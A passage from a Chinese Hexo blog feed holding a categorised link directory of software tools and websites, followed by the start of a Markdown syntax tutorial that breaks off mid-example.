<h3 id="图像处理-1"><a href="#图像处理-1" class="headerlink" title="图像处理"></a>图像处理</h3><p><a href="https://imagemagick.org/" target="_blank" rel="noopener">ImageMagick</a><br><a href="https://github.com/funbox/optimizt" target="_blank" rel="noopener">Optimizt</a><br><a href="https://bgeraser.com/" target="_blank" rel="noopener">BgEraser</a><br><a href="https://github.com/danielgatis/rembg" target="_blank" rel="noopener">Rembg</a><br><a href="https://www.gimp.org/" target="_blank" rel="noopener">GIMP</a><br><a href="https://www.darktable.org/" target="_blank" rel="noopener">darktable</a><br><a href="https://rawtherapee.com/" target="_blank" rel="noopener">RAW Therapee</a><br><a href="https://github.com/microsoft/Bringing-Old-Photos-Back-to-Life" target="_blank" rel="noopener">Old Photo Restoration</a><br><a href="https://github.com/NathanUA/U-2-Net" target="_blank" rel="noopener">U^2-Net</a><br><a href="https://github.com/CNOliverZhang/PotatofieldImageToolkit" target="_blank" rel="noopener">洋芋田图像工具箱</a><br><a href="https://inkscape.org/" target="_blank" rel="noopener">Inkscape</a><br><a href="https://www.cnblogs.com/Charltsing/p/PicGrayRemover.html" target="_blank" rel="noopener">PictureCleaner</a>  </p>
<h4 id="图片压缩"><a href="#图片压缩" class="headerlink" title="图片压缩"></a>图片压缩</h4><p><a href="https://tinypng.com/" target="_blank" rel="noopener">TinyPNG</a><br><a href="https://squoosh.app/" target="_blank" rel="noopener">Squoosh</a><br><a href="https://zh.recompressor.com/" target="_blank" rel="noopener">最优图像优化 - Recompressor</a>  </p>
<h4 id="在线图像处理"><a href="#在线图像处理" class="headerlink" title="在线图像处理"></a>在线图像处理</h4><p><a href="https://imageonline.co/" target="_blank" rel="noopener">Image Online</a><br><a href="https://pixlr.com/" target="_blank" rel="noopener">Pixlr</a><br><a href="https://www.photopea.com/" target="_blank" rel="noopener">Photopea</a><br><a href="https://www.canva.com/photo-editor/" target="_blank" rel="noopener">Canva</a><br><a href="https://www.kapwing.com/" target="_blank" rel="noopener">Kapwing</a><br><a href="https://tu.sioe.cn/gj/" target="_blank" rel="noopener">在线图片工具</a><br><a href="https://www.befunky.com/features/photo-editor/" target="_blank" rel="noopener">BeFunky</a><br><a href="https://www.picmonkey.com/photo-editor" target="_blank" rel="noopener">PicMonkey</a><br><a href="https://www6.lunapic.com/editor/" target="_blank" rel="noopener">LunaPic</a><br><a href="https://picsart.com/photo-editor" target="_blank" rel="noopener">PicsArt</a><br><a href="https://www.pictureeditor.com/" target="_blank" rel="noopener">Picture Editor</a><br><a href="https://photoeditor.pro/" target="_blank" rel="noopener">PhotoEditor.pro</a><br><a href="https://spark.adobe.com/make/photo-editor/" target="_blank" rel="noopener">Adobe Spark</a><br><a href="https://icons8.com/vector-creator/" target="_blank" rel="noopener">Vector Creator</a><br><a href="https://prettysnap.app/" target="_blank" rel="noopener">Pretty Snap</a><br><a href="https://aipix.net/" target="_blank" rel="noopener">AIpix</a>  </p>
<h5 id="抠图"><a href="#抠图" class="headerlink" title="抠图"></a>抠图</h5><p><a href="https://www.gaoding.com/koutu" target="_blank" rel="noopener">稿定抠图</a><br><a href="https://www.remove.bg/zh" target="_blank" rel="noopener">remove.bg</a>  </p>
<h3 id="视频处理"><a href="#视频处理" class="headerlink" title="视频处理"></a>视频处理</h3><p><a href="https://www.openshot.org/" target="_blank" rel="noopener">OpenShot</a><br><a href="https://shotcut.org/" target="_blank" rel="noopener">Shotcut</a><br><a href="https://kdenlive.org/" target="_blank" rel="noopener">Kdenlive</a>  </p>
<h3 id="视频格式转换"><a href="#视频格式转换" class="headerlink" title="视频格式转换"></a>视频格式转换</h3><p><a href="https://handbrake.fr/" target="_blank" rel="noopener">HandBrake</a><br><a href="https://shana.pe.kr/shanaencoder_summary" target="_blank" rel="noopener">ShanaEncoder</a>  </p>
<h5 id="抠背景"><a href="#抠背景" class="headerlink" title="抠背景"></a>抠背景</h5><p><a href="https://www.unscreen.com/" target="_blank" rel="noopener">unscreen</a>  </p>
<h3 id="音频处理"><a href="#音频处理" class="headerlink" title="音频处理"></a>音频处理</h3><p><a href="https://www.audacityteam.org/" target="_blank" rel="noopener">Audacity</a>  </p>
<h4 id="识别语音生成字幕"><a href="#识别语音生成字幕" class="headerlink" title="识别语音生成字幕"></a>识别语音生成字幕</h4><p><a href="https://otranscribe.com/" target="_blank" rel="noopener">oTranscribe</a><br><a href="https://github.com/wxbool/video-srt-windows" target="_blank" rel="noopener">VideoSrt</a>  </p>
<h3 id="网页留存"><a href="#网页留存" class="headerlink" title="网页留存"></a>网页留存</h3><p><a href="https://github.com/Y2Z/monolith" target="_blank" rel="noopener">Monolith</a><br><a href="https://web.archive.org/" target="_blank" rel="noopener">Internet Archive</a><br><a href="https://github.com/rrweb-io/rrweb" target="_blank" rel="noopener">rrweb</a>  </p>
<h3 id="监测网页变化"><a href="#监测网页变化" class="headerlink" title="监测网页变化"></a>监测网页变化</h3><p><a href="https://www.aignes.com/" target="_blank" rel="noopener">WebSite-Watcher</a><br><a href="http://owm.fatecore.com/" target="_blank" rel="noopener">OpenWebMonitor网页监控宝</a><br><a href="https://www.wachete.com/" target="_blank" rel="noopener">Wachete</a>  </p>
<h3 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h3><p><a href="https://www.wireshark.org/" target="_blank" rel="noopener">WireShark</a>  </p>
<h3 id="头像获取"><a href="#头像获取" class="headerlink" title="头像获取"></a>头像获取</h3><p><a href="https://getavatars.app/" target="_blank" rel="noopener">Get an Avatar</a><br><a href="https://picrew.me/image_maker/22819" target="_blank" rel="noopener">Picrew</a><br><a href="https://www.autodraw.com/" target="_blank" rel="noopener">AutoDraw</a><br><a href="https://meiker.io/play/11333/game.html" target="_blank" rel="noopener">Villager Creator</a><br><a href="https://www.thiswaifudoesnotexist.net/" target="_blank" rel="noopener">This Waifu Does Not Exist</a><br><a href="https://make.girls.moe/" target="_blank" rel="noopener">MakeGirlsMoe</a><br><a href="https://waifulabs.com/" target="_blank" rel="noopener">Waifu Labs</a><br><a href="https://github.com/multiavatar/multiavatar-php" target="_blank" rel="noopener">Multiavatar</a>  </p>
<h4 id="人脸"><a href="#人脸" class="headerlink" title="人脸"></a>人脸</h4><p><a href="https://thispersondoesnotexist.com/" target="_blank" rel="noopener">This Person Does Not Exist</a><br><a href="https://generated.photos/" target="_blank" rel="noopener">Generated Photos</a>  </p>
<h3 id="生成二维码"><a href="#生成二维码" class="headerlink" title="生成二维码"></a>生成二维码</h3><p><a href="https://www.the-qrcode-generator.com/" target="_blank" rel="noopener">QR Code Generator</a><br><a href="https://cli.im/" target="_blank" rel="noopener">草料二维码</a><br><a href="https://qrcode.tec-it.com/" target="_blank" rel="noopener">TEC-IT</a>  </p>
<h4 id="条形码-1"><a href="#条形码-1" class="headerlink" title="条形码"></a>条形码</h4><p><a href="https://barcode.tec-it.com/zh" target="_blank" rel="noopener">TEC-IT</a>  </p>
<h3 id="数学公式"><a href="#数学公式" class="headerlink" title="数学公式"></a>数学公式</h3><p><a href="https://www.overleaf.com/" target="_blank" rel="noopener">Overleaf</a><br><a href="http://www.wiris.com/en/mathtype" target="_blank" rel="noopener">WIRIS</a><br><a href="http://www.hostmath.com/" target="_blank" rel="noopener">HostMath</a><br><a href="https://www.mathcha.io/" target="_blank" rel="noopener">Mathcha</a>  </p>
<h3 id="在线查毒"><a href="#在线查毒" class="headerlink" title="在线查毒"></a>在线查毒</h3><p><a href="https://www.virscan.org/" target="_blank" rel="noopener">VirSCAN</a><br><a href="https://virusscan.jotti.org/" target="_blank" rel="noopener">Jotti</a><br><a href="https://www.virustotal.com/" target="_blank" rel="noopener">VirusTotal</a>  </p>
<h2 id="浏览器"><a href="#浏览器" class="headerlink" title="浏览器"></a>浏览器</h2><p><a href="https://www.microsoft.com/edge/" target="_blank" rel="noopener">Microsoft Edge</a><br><a href="https://www.google.com/chrome/" target="_blank" rel="noopener">Google Chrome</a><br><a href="https://www.mozilla.org/firefox/" target="_blank" rel="noopener">Mozilla Firefox</a><br><a href="https://vivaldi.com/" target="_blank" rel="noopener">Vivaldi</a>  </p>
<h2 id="梯子"><a href="#梯子" class="headerlink" title="梯子"></a>梯子</h2><p><a href="https://bwh1.net/" target="_blank" rel="noopener">BandwagonHost</a><br><a href="https://shadowsky.world/" target="_blank" rel="noopener">ShadowSky</a><br><a href="https://www.v2ray.com/" target="_blank" rel="noopener">V2Ray</a><br><a href="https://github.com/shadowsocks/shadowsocks-windows" target="_blank" rel="noopener">shadowsocks-windows</a><br><a href="https://github.com/shadowsocks/shadowsocks-android" target="_blank" rel="noopener">shadowsocks-android</a><br><a href="https://github.com/2dust/v2rayN" target="_blank" rel="noopener">v2rayN</a><br><a href="https://github.com/2dust/v2rayNG" target="_blank" rel="noopener">v2rayNG</a><br><a href="https://github.com/Qv2ray/Qv2ray" target="_blank" rel="noopener">Qv2ray</a><br><a href="https://github.com/trojan-gfw/trojan" target="_blank" rel="noopener">Trojan</a><br><a href="https://github.com/trojan-gfw/igniter" target="_blank" rel="noopener">Igniter</a><br><a href="https://github.com/NetchX/Netch/releases" target="_blank" rel="noopener">Netch</a><br><a href="https://github.com/FQrabbit/SSTap-Rule" target="_blank" rel="noopener">SSTap-Rule</a>  </p>
<h2 id="搜索"><a href="#搜索" class="headerlink" title="搜索"></a>搜索</h2><p><a href="https://www.baidu.com/" target="_blank" rel="noopener">百度</a><br><a href="https://cn.bing.com/" target="_blank" rel="noopener">Bing</a><br><a href="https://www.google.com/" target="_blank" rel="noopener">Google</a><br><a href="https://www.wolframalpha.com/" target="_blank" rel="noopener">WolframAlpha</a><br><a href="https://github.com/xiandanin/magnetW" target="_blank" rel="noopener">magnetW</a><br><a href="https://search.chongbuluo.com/" target="_blank" rel="noopener">虫部落 - 快搜</a>  </p>
<h3 id="文字搜索"><a href="#文字搜索" class="headerlink" title="文字搜索"></a>文字搜索</h3><p><a href="https://teshuzi.com/zh/handwriting/" target="_blank" rel="noopener">在线手写识别文字符号</a>  </p>
<h3 id="图片搜索"><a href="#图片搜索" class="headerlink" title="图片搜索"></a>图片搜索</h3><p><a href="https://saucenao.com/" target="_blank" rel="noopener">SauceNAO</a><br><a href="https://trace.moe/" target="_blank" rel="noopener">Anime Scene Search Engine</a>  </p>
<h2 id="学习"><a href="#学习" class="headerlink" title="学习"></a>学习</h2><p><a href="https://leetcode-cn.com/" target="_blank" rel="noopener">力扣 LeetCode</a><br><a href="https://www.sololearn.com/" target="_blank" rel="noopener">SoloLearn</a><br><a href="https://www.studytonight.com/" target="_blank" rel="noopener">Studytonight</a><br><a href="https://www.w3cschool.cn/" target="_blank" rel="noopener">W3Cschool</a><br><a href="https://easychen.gitee.io/foxdict/" target="_blank" rel="noopener">Fox Dict</a><br><a href="http://www.kekenet.com/" target="_blank" rel="noopener">可可英语</a><br><a href="https://www.engvid.com/" target="_blank" rel="noopener">engVid</a><br><a href="https://app.mtutor.engkoo.com/englishwriting/" target="_blank" rel="noopener">微软小英写作网站</a><br><a href="https://studyspanish.com/" target="_blank" rel="noopener">StudySpanish</a><br><a href="https://pcottle.github.com/learnGitBranching/?demo" target="_blank" rel="noopener">Learn Git Branching</a>  </p>
<h2 id="邮箱"><a href="#邮箱" class="headerlink" title="邮箱"></a>邮箱</h2><p><a href="https://mail.qq.com/" target="_blank" rel="noopener">QQ 邮箱</a><br><a href="https://www.outlook.com/" target="_blank" rel="noopener">Outlook</a>  </p>
<h2 id="下载工具"><a href="#下载工具" class="headerlink" title="下载工具"></a>下载工具</h2><p><a href="https://www.xunlei.com/" target="_blank" rel="noopener">迅雷</a><br><a href="http://www.internetdownloadmanager.com/" target="_blank" rel="noopener">Internet Download Manager</a><br><a href="https://www.freedownloadmanager.org/" target="_blank" rel="noopener">Free Download Manager</a><br><a href="http://www.eagleget.com/" target="_blank" rel="noopener">EagleGet</a><br><a href="https://motrix.app/" target="_blank" rel="noopener">Motrix</a><br><a href="https://xdown.org/" target="_blank" rel="noopener">Xdown</a><br><a href="https://github.com/anatasluo/ant" target="_blank" rel="noopener">ANT Downloader</a><br><a href="https://www.emule-project.net/" target="_blank" rel="noopener">eMule</a><br><a href="https://github.com/aria2/aria2" target="_blank" rel="noopener">aria2</a><br><a href="https://github.com/persepolisdm/persepolis" target="_blank" rel="noopener">Persepolis Download Manager</a>  </p>
<h3 id="种子"><a href="#种子" class="headerlink" title="种子"></a>种子</h3><p><a href="https://www.utorrent.com/" target="_blank" rel="noopener">μTorrent</a><br><a href="https://www.qbittorrent.org/" target="_blank" rel="noopener">qBittorrent</a><br><a href="https://github.com/c0re100/qBittorrent-Enhanced-Edition" target="_blank" rel="noopener">qBittorrent Enhanced Edition</a><br><a href="http://www.bitcomet.com/en" target="_blank" rel="noopener">BitComet</a><br><a href="http://www.vuze.com/" target="_blank" rel="noopener">Vuze</a><br><a href="https://github.com/ngosang/trackerslist" target="_blank" rel="noopener">TrackerList</a><br><a href="https://github.com/XIU2/TrackersListCollection" target="_blank" rel="noopener">TrackersListCollection</a>  </p>
<h3 id="视频-1"><a href="#视频-1" class="headerlink" title="视频"></a>视频</h3><p><a href="https://github.com/ytdl-org/youtube-dl/" target="_blank" rel="noopener">youtube-dl</a><br><a href="https://github.com/soimort/you-get" target="_blank" rel="noopener">You-Get</a><br><a href="https://github.com/ingbyr/VDM" target="_blank" rel="noopener">Video Download Manager</a>  </p>
<h2 id="网盘"><a href="#网盘" class="headerlink" title="网盘"></a>网盘</h2><p><a href="https://pan.baidu.com/" target="_blank" rel="noopener">百度网盘</a><br><a href="https://www.onedrive.com/" target="_blank" rel="noopener">OneDrive</a><br><a href="https://www.lanzou.com/" target="_blank" rel="noopener">蓝奏云</a><br><a href="https://cowtransfer.com/" target="_blank" rel="noopener">奶牛快传</a><br><a href="https://send.firefox.com/" target="_blank" rel="noopener">Firefox Send</a>  </p>
<h2 id="图床"><a href="#图床" class="headerlink" title="图床"></a>图床</h2><p><a href="https://github.com/Molunerfinn/PicGo" target="_blank" rel="noopener">PicGo</a><br><a href="https://imgkr.com/" target="_blank" rel="noopener">图壳</a><br><a href="http://pic.ibilibili.xyz/" target="_blank" rel="noopener">零度图床</a><br><a href="https://imgurl.org/" target="_blank" rel="noopener">开源图床</a><br><a href="https://sm.ms/" target="_blank" rel="noopener">SM.MS图床</a><br><a href="https://www.niupic.com/" target="_blank" rel="noopener">牛图网</a><br><a href="https://imgchr.com/" target="_blank" rel="noopener">路过图床</a><br><a href="https://img.545141.com/" target="_blank" rel="noopener">简单图床</a>  </p>
<h2 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h2><p><a href="https://www.coolapk.com/" target="_blank" rel="noopener">酷安网</a><br><a href="https://apkpure.com/" target="_blank" rel="noopener">APKPure</a><br><a href="https://play.google.com/" target="_blank" rel="noopener">Google Play</a><br><a href="https://www.appinn.com/" target="_blank" rel="noopener">小众软件</a><br><a href="https://msdn.itellyou.cn/" target="_blank" rel="noopener">MSDN, 我告诉你</a><br><a href="https://msdn.sjjzm.com/" target="_blank" rel="noopener">MSDN - 山己几子木</a>  </p>
<h2 id="壁纸"><a href="#壁纸" class="headerlink" title="壁纸"></a>壁纸</h2><p><a href="https://www.nasa.gov/" target="_blank" rel="noopener">NASA</a><br><a href="https://www.pexels.com/" target="_blank" rel="noopener">Pexels</a><br><a href="https://unsplash.com/" target="_blank" rel="noopener">Unsplash</a><br><a href="https://stocksnap.io/" target="_blank" rel="noopener">StockSnap.io</a><br><a href="http://streetwill.co/" target="_blank" rel="noopener">StreetWill</a><br><a href="https://gratisography.com/" target="_blank" rel="noopener">Gratisography</a><br><a href="https://www.textures.com/" target="_blank" rel="noopener">textures</a><br><a href="https://pixabay.com/" target="_blank" rel="noopener">pixabay</a><br><a href="https://www.lifeofpix.com/" target="_blank" rel="noopener">Life Of Pix</a><br><a href="https://www.hippopx.com/" target="_blank" rel="noopener">Hippo px</a><br><a href="https://www.colorhub.me/" target="_blank" rel="noopener">Color Hub</a><br><a href="https://www.pinterest.com/" target="_blank" rel="noopener">Pinterest</a><br><a href="https://visualhunt.com/" target="_blank" rel="noopener">VisualHunt</a><br><a href="http://cupcake.nilssonlee.se/" target="_blank" rel="noopener">Cupcake</a><br><a href="https://wall.alphacoders.com/" target="_blank" rel="noopener">Wallpaper Abyss</a><br><a href="https://wallpapersite.com/" target="_blank" rel="noopener">WallpaperSite</a><br><a href="https://wallpaperscraft.com/" target="_blank" rel="noopener">WallpapersCraft</a><br><a href="https://wallhaven.cc/" target="_blank" rel="noopener">WallHaven</a><br><a href="https://bz.zzzmh.cn/" target="_blank" rel="noopener">极简壁纸</a><br><a href="https://bing.ioliu.cn/" target="_blank" rel="noopener">必应每日高清壁纸</a><br><a href="https://www.ssyer.com/" target="_blank" rel="noopener">SSYER | 沙沙野</a><br><a href="https://www.toptal.com/designers/subtlepatterns/" target="_blank" rel="noopener">Subtle Patterns</a><br><a href="https://coolbackgrounds.io/" target="_blank" rel="noopener">Cool Backgrounds</a>  </p>
<h2 id="地图"><a href="#地图" class="headerlink" title="地图"></a>地图</h2><p><a href="https://www.amap.com/" target="_blank" rel="noopener">高德地图</a><br><a href="https://map.baidu.com/" target="_blank" rel="noopener">百度地图</a><br><a href="https://www.google.com/maps" target="_blank" rel="noopener">Google 地图</a>  </p>
<h2 id="购物"><a href="#购物" class="headerlink" title="购物"></a>购物</h2><p><a href="https://www.jd.com/" target="_blank" rel="noopener">京东</a><br><a href="https://www.taobao.com/" target="_blank" rel="noopener">淘宝</a><br><a href="https://www.tmall.com/" target="_blank" rel="noopener">天猫</a><br><a href="https://www.amazon.cn/" target="_blank" rel="noopener">亚马逊</a>  </p>
<h2 id="比价"><a href="#比价" class="headerlink" title="比价"></a>比价</h2><p><a href="http://www.xitie.com/" target="_blank" rel="noopener">西贴 网上商品历史价格</a><br><a href="https://www.smzdm.com/" target="_blank" rel="noopener">什么值得买</a>  </p>
<h2 id="翻译"><a href="#翻译" class="headerlink" title="翻译"></a>翻译</h2><p><a href="https://www.deepl.com/translator" target="_blank" rel="noopener">DeepL翻译</a><br><a href="http://dict.cnki.net/" target="_blank" rel="noopener">CNKI翻译助手</a><br><a href="https://fanyi.baidu.com/" target="_blank" rel="noopener">百度翻译</a><br><a href="https://translate.google.com/" target="_blank" rel="noopener">Google 翻译</a><br><a href="https://www.bing.com/translator" target="_blank" rel="noopener">Bing 翻译</a><br><a href="http://dict.youdao.com/" target="_blank" rel="noopener">有道词典</a>  </p>
<h2 id="运营商"><a href="#运营商" class="headerlink" title="运营商"></a>运营商</h2><p><a href="https://www.10086.cn/" target="_blank" rel="noopener">中国移动</a><br><a href="https://www.189.cn/" target="_blank" rel="noopener">中国电信</a><br><a href="https://www.10010.com/" target="_blank" rel="noopener">中国联通</a>  </p>
<h2 id="服务器"><a href="#服务器" class="headerlink" title="服务器"></a>服务器</h2><p><a href="https://homenew.console.aliyun.com/" target="_blank" rel="noopener">阿里云控制台</a><br><a href="https://console.cloud.tencent.com/" target="_blank" rel="noopener">腾讯云控制台</a>  </p>
<h2 id="聚合新闻"><a href="#聚合新闻" class="headerlink" title="聚合新闻"></a>聚合新闻</h2><p><a href="https://tophub.today/" target="_blank" rel="noopener">今日热榜</a><br><a href="https://mo.fish/" target="_blank" rel="noopener">鱼塘热榜</a><br><a href="http://ilxdh.com/" target="_blank" rel="noopener">龙轩导航</a>  </p>
<h2 id="博客引擎"><a href="#博客引擎" class="headerlink" title="博客引擎"></a>博客引擎</h2><p><a href="https://wordpress.org/" target="_blank" rel="noopener">WordPress</a><br><a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a><br><a href="https://jekyllrb.com/" target="_blank" rel="noopener">Jekyll</a><br><a href="http://typecho.org/" target="_blank" rel="noopener">Typecho</a>  </p>
<h2 id="在线协同"><a href="#在线协同" class="headerlink" title="在线协同"></a>在线协同</h2><p><a href="https://www.seafile.com/" target="_blank" rel="noopener">Seafile</a><br><a href="https://www.seatable.cn/" target="_blank" rel="noopener">SeaTable</a>  </p>
<h2 id="其它-3"><a href="#其它-3" class="headerlink" title="其它"></a>其它</h2><p><a href="https://adzhp.cn/" target="_blank" rel="noopener">爱打杂货铺</a><br><a href="https://www.tianyancha.com/" target="_blank" rel="noopener">天眼查</a><br><a href="https://www.qichacha.com/" target="_blank" rel="noopener">企查查</a><br><a href="http://www.chongdiantou.com/" target="_blank" rel="noopener">充电头网</a><br><a href="https://github.com/awesome-selfhosted/awesome-selfhosted" target="_blank" rel="noopener">Selfhosted</a><br><a href="https://sexpositions.club/" target="_blank" rel="noopener">SexPositions</a><br><a href="http://satori.mycard.moe/" target="_blank" rel="noopener">好耶 是女装</a><br><a href="http://www.ypppt.com/" target="_blank" rel="noopener">优品PPT</a><br><a href="https://meta.appinn.net/t/topic/11968/51" target="_blank" rel="noopener">在线小工具</a><br><a href="https://stellarium-web.org/" target="_blank" rel="noopener">Stellarium</a><br><a href="https://flk.npc.gov.cn/" target="_blank" rel="noopener">国家法律法规数据库</a><br><a href="https://github.com/Werneror/Poetry" target="_blank" rel="noopener">古今诗词合集</a><br><a href="https://github.com/liuhuanyong/ChineseDiachronicCorpus" target="_blank" rel="noopener">中文历时语料库</a><br><a href="https://qxk.bnu.edu.cn/" target="_blank" rel="noopener">汉字全息资源应用系统</a><br><a href="https://www.moedict.tw/" target="_blank" rel="noopener">萌典</a><br><a href="https://www.urbandictionary.com/" target="_blank" rel="noopener">Urban Dictionary</a><br><a href="https://zh.wikihow.com/" target="_blank" rel="noopener">wikiHow中文</a><br><a href="https://www.wikihow.com/" target="_blank" rel="noopener">wikiHow英文</a><br><a href="https://rarbg.to/" target="_blank" rel="noopener">RARBG</a><br><a href="https://keyboardsimulator.xyz/" target="_blank" rel="noopener">Keyboard Simulator</a><br><a href="https://panelook.cn/" target="_blank" rel="noopener">屏库</a><br><a href="https://typewars.netlify.app/" target="_blank" rel="noopener">TypeWars</a><br><a href="https://github.com/parzulpan/real-live" target="_blank" rel="noopener">RealLive</a><br><a href="https://www.lastpass.com/username-generator" target="_blank" rel="noopener">Username Generator | LastPass</a><br><a href="https://github.com/lowlighter/metrics" target="_blank" rel="noopener">Metrics</a><br><a href="https://live.jbdd.eu/player/?url=" target="_blank" rel="noopener">鉴宝弹幕</a><br><a href="https://15.ai/" target="_blank" rel="noopener">15.ai: Natural TTS with minimal data</a>  </p>
]]></content>
      
        <categories>
            
            <category> 杂谈 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[Hexo 下的 Markdown 语法 和 MathJax 下的 LaTeX 语法]]></title>
      <url>/2019/08/30/MarkdownSyntax/</url>
      <content type="html"><![CDATA[<blockquote>
<p>Markdown：<br><a href="https://www.ofind.cn/blog/HEXO/HEXO下的Markdown语法(GFM)写博客.html" target="_blank" rel="noopener">https://www.ofind.cn/blog/HEXO/HEXO下的Markdown语法(GFM)写博客.html</a>  </p>
</blockquote>
<blockquote>
<p>LaTeX：<br><a href="https://www.zybuluo.com/knight/note/96093" target="_blank" rel="noopener">https://www.zybuluo.com/knight/note/96093</a><br><a href="https://www.cnblogs.com/linxd/p/4955530.html" target="_blank" rel="noopener">https://www.cnblogs.com/linxd/p/4955530.html</a><br><a href="https://blog.csdn.net/ajacker/article/details/80301378" target="_blank" rel="noopener">https://blog.csdn.net/ajacker/article/details/80301378</a><br><a href="https://github.com/CTeX-org/lshort-zh-cn" target="_blank" rel="noopener">https://github.com/CTeX-org/lshort-zh-cn</a><br><a href="https://www.mathjax.org/#demo" target="_blank" rel="noopener">https://www.mathjax.org/#demo</a></p>
</blockquote>
<h1 id="Markdown"><a href="#Markdown" class="headerlink" title="Markdown"></a>Markdown</h1><h2 id="语法简明概述"><a href="#语法简明概述" class="headerlink" title="语法简明概述"></a>语法简明概述</h2><ol>
<li>分段 <code>两个回车</code></li>
<li>换行 <code>两个空格</code>+<code>回车</code></li>
<li>标题 <code>#</code>~<code>######</code>，<code>#</code>的个数表示几级标题，即表示一级标题到六级标题</li>
<li>强调 <code>**粗体**</code>，<code>__粗体__</code>，<code>*斜体*</code>，<code>_斜体_</code>，<code>***加粗斜体***</code>，<code>___加粗斜体___</code>，<code>~~删除线~~</code></li>
<li>引用 <code>&gt;</code> 注意后面紧跟个空格，<code>&gt;</code>的个数表示几级引用</li>
<li>表格 <code>-</code>和<code>|</code>分割行和列，<code>:</code>控制对齐方式。表格内换行：<code>&lt;br&gt;</code></li>
<li>代码块 使用<code>```语言</code>代码内容<code>```</code></li>
<li>链接 <code>[文字](链接地址)</code></li>
<li>图片 <code>![图片说明](图片地址)</code>，地址可以是本地路径，也可以是网络地址</li>
<li>无序列表 <code>*</code>，<code>+</code>，<code>-</code>，选其中之一，注意后面紧跟个空格</li>
<li>有序列表 <code>1.</code>，<code>2.</code>，<code>3.</code>等，注意后面紧跟个空格</li>
<li>代办事项 <code>- [ ] 未完成</code>，<code>- [x] 已完成</code></li>
<li>分隔线 <code>---</code>或<code>***</code>或<code>___</code>，<code>-</code>或<code>*</code>或<code>_</code>的个数三个或以上</li>
<li>半角空格<code>&amp;ensp;</code>或<code>&amp;#8194;</code></li>
<li>全角空格<code>&amp;emsp;</code>或<code>&amp;#8195;</code></li>
<li>不断行空格<code>&amp;nbsp;</code>或<code>&amp;#160;</code><a id="more"></a>

</li>
</ol>
<h2 id="标题"><a href="#标题" class="headerlink" title="标题"></a>标题</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 一级标题</span><br><span class="line">## 二级标题</span><br><span class="line">### 三级标题</span><br><span class="line">#### 四级标题</span><br><span class="line">##### 五级标题</span><br><span class="line">###### 六级标题</span><br><span class="line">####### 没有七级标题，但会影响生成目录，目录行多出一行空行</span><br></pre></td></tr></table></figure>

<h2 id="内容强调"><a href="#内容强调" class="headerlink" title="内容强调"></a>内容强调</h2><h3 id="加粗、斜体"><a href="#加粗、斜体" class="headerlink" title="加粗、斜体"></a>加粗、斜体</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">字体 *斜体* 或 _斜体_ 显示</span><br><span class="line">字体 **加粗** 或 __加粗__ 显示</span><br><span class="line">字体 ***加粗斜体*** 或 ___加粗斜体___ 或以上任意两者组合 显示</span><br></pre></td></tr></table></figure>

<blockquote>
<p><em>斜体</em><br><strong>加粗</strong><br><strong><em>加粗斜体</em></strong>  </p>
</blockquote>
<h3 id="删除线"><a href="#删除线" class="headerlink" title="删除线"></a>删除线</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">字体 ~~删除线~~ 显示</span><br></pre></td></tr></table></figure>

<blockquote>
<p><del>删除线</del>  </p>
</blockquote>
<h3 id="高亮"><a href="#高亮" class="headerlink" title="高亮"></a>高亮</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">使用&lt;code&gt;内容&lt;/code&gt;或`内容`来强调内容</span><br><span class="line">在code中需用\来转义符号`</span><br></pre></td></tr></table></figure>

<blockquote>
<p><code>强调内容</code>  </p>
</blockquote>
<h3 id="引用显示"><a href="#引用显示" class="headerlink" title="引用显示"></a>引用显示</h3><h4 id="标准使用"><a href="#标准使用" class="headerlink" title="标准使用"></a>标准使用</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">每行都使用&gt;+空格+内容</span><br><span class="line">&gt; 引用内容</span><br></pre></td></tr></table></figure>

<blockquote>
<p>引用内容  </p>
</blockquote>
<h4 id="省略使用"><a href="#省略使用" class="headerlink" title="省略使用"></a>省略使用</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; 仅第一行加&gt;号</span><br><span class="line">后续内容自动变成引用内容</span><br><span class="line">两个回车换行结束引用</span><br></pre></td></tr></table></figure>

<blockquote>
<p>第一行加<code>&gt;</code><br>第二行无<code>&gt;</code><br>第三行无<code>&gt;</code>  </p>
</blockquote>
<p>第四行无<code>&gt;</code>  </p>
<h4 id="嵌套使用"><a href="#嵌套使用" class="headerlink" title="嵌套使用"></a>嵌套使用</h4><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&gt; 动物</span><br><span class="line">&gt;&gt; 水生动物</span><br><span class="line">&gt;&gt; 陆生动物</span><br><span class="line">&gt;&gt;&gt; 猴子</span><br><span class="line">&gt;&gt;&gt; 人</span><br><span class="line">&gt;&gt;&gt;&gt; 程序员</span><br><span class="line">&gt;&gt;&gt;&gt; 工程师</span><br><span class="line">&gt;&gt; 产品经理 <span class="comment">//没有空行间隔，忽略降级引用标记</span></span><br><span class="line">设计师 <span class="comment">//没有空行间隔，忽略降级引用标记</span></span><br><span class="line"></span><br><span class="line">&gt;&gt; 两栖动物</span><br><span class="line">&gt;&gt;&gt; 鳄鱼</span><br></pre></td></tr></table></figure>

<blockquote>
<p>动物  </p>
<blockquote>
<p>水生动物<br>陆生动物  </p>
<blockquote>
<p>猴子<br>人  </p>
<blockquote>
<p>程序员<br>工程师<br>产品经理<br>设计师  </p>
